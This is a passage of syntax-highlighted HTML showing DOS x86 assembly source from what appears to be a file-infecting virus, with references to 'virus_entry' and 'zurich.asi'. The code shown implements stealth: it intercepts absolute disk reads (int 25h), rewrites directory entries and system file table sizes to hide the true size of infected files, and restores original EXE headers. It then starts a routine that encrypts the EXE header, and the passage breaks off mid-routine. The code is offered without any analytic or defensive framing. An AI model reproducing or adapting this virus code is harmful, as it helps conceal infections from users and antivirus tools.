</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">virus_entry</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">zurich.asi</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">offset25</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">call_real_25</span><span class="sc0">        </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">restore_header</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">stealthname</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">test_size</span><span class="sc0">           </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">doscall</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">get_sft</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosread</span><span class="sc0">             </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">heap</span><span class="sc0">                </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">dosclose</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">vir_heap</span><span class="sc0">            </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;-+-[ stealth 25 ]---------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">; dir entry stealth</span><span class="sc0">
</span><span class="sc1">; DS:SI = @dir_size_h</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">Stealth_Abs</span><span class="sc0">
    </span><span class="sc5">ifInfJump</span><span class="sc0">   </span><span class="sc5">Buf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+(</span><span class="sc5">dir_size_l</span><span class="sc4">-</span><span class="sc5">dir_size_h</span><span class="sc4">)],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;stealth patch size in dir entry</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+(</span><span class="sc5">dir_size_h</span><span class="sc4">-</span><span class="sc5">dir_size_h</span><span class="sc4">)],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">; exe header int25 stealth ?</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">Stealth_Abs_r</span><span class="sc0">
    </span><span class="sc5">ifInfJump</span><span class="sc0">   </span><span class="sc5">Buf</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">  </span><span class="sc1">;real file size</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">file_for_fake_open</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D40h</span><span class="sc0"> </span><span class="sc1">;open readonly</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; DPB offset in AX</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">NC</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">;handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">
</span><span class="sc1">;        mov     es:[di.sf_position.lo], ax</span><span class="sc0">
</span><span class="sc1">;        mov     es:[di.sf_position.hi], dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;file size</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_size.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_size.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">abs_read_drive</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;&lt;&lt;&lt;&lt;&lt; gluk</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11100000b</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;future: flop no stealth ? (to slow)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_devptr.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_devptr.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">start_sec.hi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">start_sec.lo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">dpb_first_sector</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">dpb_cluster_mask</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc1">;if DX != 0 - error</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">di.sf_firclus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">35h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">;file size</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_header</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">scasw</span><span class="sc0">   </span><span class="sc1">;add di,2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16h</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">dosclose</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">file_for_fake_open</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">StealthName</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc1">; test after absolute read for exe-header &amp; dir entry</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">st25</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">;AbsDisk_start_sect.hi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">;(inc cx, jz)?</span><span class="sc0">
    </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">E</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">bx.AbsDisk_start_sect.lo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">bx.AbsDisk_start_sect.hi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">bx.AbsDisk_buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">DONE</span><span class="sc0">            </span><span class="sc1">;here, DS:SI - read buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">start_sec.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">start_sec.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._exehdr</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Stealth_Abs_r</span><span class="sc0">
    </span><span class="sc5">DO</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                            </span><span class="sc1">;1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
</span><span class="sc5">end_search</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">                        </span><span class="sc1">;0B</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">end_search</span><span class="sc0">          </span><span class="sc1">;no_dir_entry</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0"> </span><span class="sc1">;attr of file              ;15</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10d</span><span class="sc0">
        </span><span class="sc5">DO</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">                        </span><span class="sc1">;16</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;unused, must be zero</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">end_search</span><span class="sc0"> </span><span class="sc1">;no_dir_entry</span><span class="sc0">
        </span><span class="sc5">CYCLE</span><span class="sc0"> </span><span class="sc5">LU</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">            </span><span class="sc1">;dir_size_l</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">test_size</span><span class="sc0">
        </span><span class="sc5">DOIF</span><span class="sc0"> </span><span class="sc5">Z</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">abs_read_drive</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; = $-1</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;future: flop no stealth ? (to slow)</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DosCall</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">dpb_cluster_mask</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">dpb_first_sector</span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:(</span><span class="sc5">dir_first</span><span class="sc4">-</span><span class="sc5">dir_size_h</span><span class="sc4">)[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">cwd</span><span class="sc0">
            </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;dx:ax-first sector</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc5">MOVSEG</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.AbsDisk_start_sect.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.AbsDisk_start_sect.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.AbsDisk_sect_num</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.AbsDisk_buffer.lo</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">bx.AbsDisk_buffer.hi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">abs_read_drive</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">call_real_25</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">HDRBUFSIZE</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">vir_heap._exehdr</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Stealth_Abs</span><span class="sc0">
        </span><span class="sc5">DONE</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc5">CYCLE</span><span class="sc0">
</span><span class="sc1">;-+------------------------------------------------------------------------+-</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">code</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">ZURICH.ASI</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">dataencriptor</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">start_data</span><span class="sc0">    </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">_____</span><span class="sc0">         </span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc0">          </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">vir_heap</span><span class="sc0">      </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">get_cur_time</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">RANDOMIZE</span><span class="sc0">     </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">dosseek_bof</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">read_buf_22</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc10">near</span><span class="sc0">

</span><span class="sc9">.LALL</span><span class="sc0">

</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">crypt_exe_header</span><span class="sc0">
</span><span class="sc1">;int 2bh</span><span class="sc0">
</span><span class="sc1">;    push    ax dx</span><span class="sc0">
</span><span class="sc1">;    call    dosseek_bof</span><span class="sc0">
</span><span class="sc1">;    call    read_buf_22</span><span class="sc0">
</span><span class="sc1">;    pop     dx ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">exehdr.exe_par_dir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">pblabel</span><span class="sc0"> </span><span class="sc5">crypt_exe_header_custom</span><span class="sc0">
    </span><span class="sc5">movseg</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc0">
